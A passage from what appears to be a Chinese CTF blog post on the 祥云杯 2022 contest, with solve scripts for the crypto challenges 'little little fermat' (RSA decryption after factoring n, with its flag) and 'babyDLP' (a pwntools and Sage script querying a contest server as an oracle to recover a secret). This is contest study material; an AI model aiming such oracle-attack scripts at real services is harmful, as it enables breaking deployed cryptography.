punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token comment">#flag&#123;8f504aee71626212f275117326722b6c0ccc94f4039ed31fbcfde08e026352c4&#125;</span></pre></td></tr></table></figure><h4 id="little-little-fermat"><a class="anchor" href="#little-little-fermat">#</a> little little fermat</h4><p>yafu 分解 n</p><p>得到 p，q</p><p>由</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11451</mn><msup><mn>4</mn><mi>x</mi></msup><mspace width="1em"><mi>m</mi><mi>o</mi><mi>d</mi><mspace width="1em"><mi>p</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">114514^x\quad mod\quad p=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span><span class="mord">1</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.664392em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span></span></span></span></p><p>费马小定理</p><p>得到 x=p-1</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p <span class="token operator">=</span> <span class="token number">11887853772894265642834649929578157180848240939084164222334476057487485972806971092902627112665734648016476153593841839977704512156756634066593725142934001</span></pre></td></tr><tr><td data-num="4"></td><td><pre>q <span class="token operator">=</span> <span class="token number">11887853772894265642834649929578157180848240939084164222334476057487485972806971092902627112665734646483980612727952939084061619889139517526028673988305393</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> <span class="token number">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span></pre></td></tr><tr><td data-num="6"></td><td><pre>c <span class="token operator">=</span> <span class="token number">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span></pre></td></tr><tr><td data-num="7"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="8"></td><td><pre>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#print(pow(114514,p-1,p))</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#flag&#123;I~ju5t_w@nt_30_te11_y0u_how_I_@m_f3ll1ng~&#125;</span></pre></td></tr></table></figure><h4 id="babydlp"><a class="anchor" href="#babydlp">#</a> babyDLP</h4><p>看到 p 有点眼熟</p><p>搜了一下发现<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDYyNzAzNTE=">春哥</span> CryptoCTF 原题</p><p>直接拿来用</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Gao</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token comment"># self.conn = process(['python3', 'another.py'])</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        self<span class="token punctuation">.</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.106.13.71"</span><span class="token punctuation">,</span><span class="token number">34092</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        self<span class="token punctuation">.</span>p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">234</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">267</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">291</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">403</span> <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        self<span class="token punctuation">.</span>s_high <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        self<span class="token punctuation">.</span>Zp <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>self<span class="token punctuation">.</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">gao_check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'T'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        ans <span class="token operator">=</span> self<span class="token punctuation">.</span>Zp<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span>self<span class="token punctuation">.</span>s_high<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Guessing: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'integer: \n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        a <span class="token operator">=</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Great!'</span> <span class="token keyword">in</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">gao_one</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'T'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        ans <span class="token operator">=</span> self<span class="token punctuation">.</span>Zp<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>nth_root<span class="token punctuation">(</span>self<span class="token punctuation">.</span>s_high<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'integer: \n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        a <span class="token operator">=</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">b'Great!'</span> <span class="token keyword">in</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            a <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        t<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        self<span class="token punctuation">.</span>s_high <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            self<span class="token punctuation">.</span>s_high <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">-</span> t</pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;:b&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>s_high<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">gao</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>gao_one<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="53"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>t <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>gao_check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">gao_2</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1023</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="59"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>gao_one<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                self<span class="token punctuation">.</span>gao_check<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                self<span class="token punctuation">.</span>s_high <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    g <span class="token operator">=</span> Gao<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    g<span class="token punctuation">.</span>gao_2<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/229bd027e39d4f2cb9587bd2838fb984.png" alt="img"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-11-09 18:39:13" itemprop="dateModified" datetime="2022-11-09T18:39:13+08:00">2022-11-09</time> </span><span id="2022/11/09/match/祥云杯/" class="item leancloud_visitors" data-flag-title="祥云杯" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Putao0v0 <i class="ic i-at"><em>@</em></i>putao</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/" title="祥云杯">http://example.com/2022/11/09/match/祥云杯/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/09/25/web/%E5%B8%B8%E7%94%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63f1dd6cf144a01007af346b.jpg" title="常用"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> WEB</span><h3>常用</h3></a></div><div class="item right"><a href="/2022/11/17/study/AWD%E5%87%86%E5%A4%87/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63f1dd6df144a01007af3540.jpg" title="AWD准备"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 学习</span><h3>AWD准备</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava"><span class="toc-number">1.1.</span> <span class="toc-text">ezjava</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funweb"><span class="toc-number">1.2.</span> <span class="toc-text">FunWEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rustwaf"><span class="toc-number">1.3.</span> <span class="toc-text">RustWaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference"><span class="toc-number">1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#strange_forensics"><span class="toc-number">2.1.</span> <span class="toc-text">strange_forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ps%E8%B8%A9%E5%9D%91"><span class="toc-number">2.1.1.</span> <span class="toc-text">ps: 踩坑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%88%9B%E5%BB%BAvtypes"><span class="toc-number">2.1.2.</span> <span class="toc-text">1. 创建 vtypes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">2. 获取符号表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E5%88%B6%E4%BD%9C%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.4.</span> <span class="toc-text">3. 制作用户配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="toc-number">2.1.5.</span> <span class="toc-text">4、开始做题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fill"><span class="toc-number">3.0.1.</span> <span class="toc-text">fill</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#little-little-fermat"><span class="toc-number">3.0.2.</span> <span class="toc-text">little little fermat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babydlp"><span class="toc-number">3.0.3.</span> <span class="toc-text">babyDLP</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/02/23/match/ctfshow%E5%AF%86%E7%A0%81%E6%8C%91%E6%88%98/" rel="bookmark" title="ctfshow密码挑战">ctfshow密码挑战</a></li><li><a href="/2022/02/23/match/ByteCTF/" rel="bookmark" title="ByteCTF">ByteCTF</a></li><li><a href="/2022/03/02/match/%E5%8D%B7%E7%8E%8B%E6%9D%AF/" rel="bookmark" title="卷王杯">卷王杯</a></li><li><a href="/2022/03/03/match/VN2022/" rel="bookmark" title="VN2022">VN2022</a></li><li><a href="/2022/03/12/match/d%5E3ctf/" rel="bookmark" title="d^3ctf">d^3ctf</a></li><li><a href="/2022/03/21/match/%E8%99%8E%E7%AC%A6%E6%9D%AF/" rel="bookmark" title="虎符杯">虎符杯</a></li><li><a href="/2022/03/24/match/%E7%BA%A2%E6%98%8E%E8%B0%B72022/" rel="bookmark" title="红明谷2022">红明谷2022</a></li><li><a href="/2022/04/09/match/HZNUCTF/" rel="bookmark" title="HZNUCTF">HZNUCTF</a></li><li><a href="/2022/04/27/match/DASCTF%20Apr%20X%20FATE%20%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF Apr X FATE 防疫挑战赛">DASCTF Apr X FATE 防疫挑战赛</a></li><li><a href="/2022/05/16/match/PWNHUB/" rel="bookmark" title="PWNHUB">PWNHUB</a></li><li><a href="/2022/05/16/match/%E5%AE%81%E6%B3%A2%E5%B8%82%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" rel="bookmark" title="宁波市第五届网络安全大赛">宁波市第五届网络安全大赛</a></li><li><a href="/2022/05/27/match/Dest0g3/" rel="bookmark" title="Dest0g3">Dest0g3</a></li><li><a href="/2022/05/27/match/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF/" rel="bookmark" title="ctfshow单身杯">ctfshow单身杯</a></li><li><a href="/2022/06/30/match/DASCTF%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF出题人挑战赛">DASCTF出题人挑战赛</a></li><li><a href="/2022/07/08/match/babyrsa/" rel="bookmark" title="鹏程杯2022">鹏程杯2022</a></li><li><a href="/2022/07/11/match/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/" rel="bookmark" title="蓝帽杯2022">蓝帽杯2022</a></li><li><a href="/2022/07/18/match/DSCTF/" rel="bookmark" title="DSCTF">DSCTF</a></li><li><a href="/2022/07/18/match/NepNep/" rel="bookmark" title="NepNep">NepNep</a></li><li><a href="/2022/07/21/match/CRYPTO%20CTF/" rel="bookmark" title="CRYPTO CTF">CRYPTO CTF</a></li><li><a href="/2022/07/25/match/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B/" rel="bookmark" title="DASCTF2022.07赋能赛">DASCTF2022.07赋能赛</a></li><li><a href="/2022/08/01/match/%E5%BC%BA%E7%BD%91%E6%9D%AF/" rel="bookmark" title="强网杯2022">强网杯2022</a></li><li><a href="/2022/08/04/match/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/" rel="bookmark" title="ctfshow七夕杯">ctfshow七夕杯</a></li><li><a href="/2022/08/29/match/%E7%BD%91%E9%BC%8E%E6%9D%AF/" rel="bookmark" title="网鼎杯预赛2022">网鼎杯预赛2022</a></li><li><a href="/2022/09/16/match/%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/" rel="bookmark" title="柏鹭杯">柏鹭杯</a></li><li><a href="/2022/09/17/match/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B/" rel="bookmark" title="2022浙江省赛">2022浙江省赛</a></li><li><a href="/2022/09/20/match/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF X GFCTF 2022十月挑战赛">DASCTF X GFCTF 2022十月挑战赛</a></li><li><a href="/2022/09/20/match/DASCTF%20X%20CBCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" rel="bookmark" title="DASCTF X CBCTF 2022九月挑战赛">DASCTF X CBCTF 2022九月挑战赛</a></li><li><a href="/2022/09/24/match/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/" rel="bookmark" title="2022浙江省赛">2022浙江省赛</a></li><li class="active"><a href="/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/" rel="bookmark" title="祥云杯">祥云杯</a></li><li><a href="/2022/11/27/match/DASCTF%20NOV/" rel="bookmark" title="DASCTF NOV X联合出题人2022年度积分榜争夺赛！">DASCTF NOV X联合出题人2022年度积分榜争夺赛！</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Putao0v0" data-src="/images/1.jpg"><p class="name" itemprop="name">Putao0v0</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">59</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">3</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1dGFvLWFp" title="https:&#x2F;&#x2F;github.com&#x2F;putao-ai"><i class="ic i-github"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20vdS8zNjEyMTE4NDMy" title="https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;3612118432"><i class="ic i-weibo"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/09/25/web/%E5%B8%B8%E7%94%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/11/17/study/AWD%E5%87%86%E5%A4%87/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Putao0v0 @ Putao0v0</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">525k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">7:57</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var 